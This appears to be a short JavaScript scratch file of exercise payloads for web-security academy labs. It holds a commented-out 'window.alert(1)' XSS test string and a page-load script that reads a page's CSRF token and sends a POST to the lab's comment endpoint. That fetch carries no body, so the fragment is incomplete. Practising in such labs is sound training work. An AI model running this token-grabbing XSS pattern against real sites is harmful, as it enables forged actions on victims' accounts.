// Lab 08
//const encoded = encodeURIComponent('window.alert(1)');
//const decoded = decodeURIComponent(encoded);
//console.log(encoded);

// Lab 11
window.onload = function(e) {
    var csrf = document.getElementsByName("csrf")[0].value;
    console.log(csrf);
    fetch('https://ac831f741fec961ec04fca9300e00070.web-security-academy.net/post/comment/', {
        method: 'POST',
    });
};
